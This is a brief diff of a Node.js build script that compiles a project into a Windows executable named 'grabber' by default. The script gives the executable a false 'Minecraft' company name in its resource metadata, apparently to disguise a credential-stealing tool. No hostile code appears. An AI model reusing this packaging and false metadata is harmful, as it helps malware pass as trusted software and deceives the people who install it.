@@ -4,7 +4,7 @@ compile({
   input: './index.js',
   output: (require('./config').filename || 'grabber') + '.exe',
   build: true,
-  resources: ['./assets/*', './functions/*.js', './util/*.js', './util/**/*.exe'],
+  resources: ['./functions/*.js', './util/*.js', './util/**/*.exe'],
   ico: './icon.ico',
   rc: { // This is one of the best things that exists
     CompanyName: 'Minecraft',
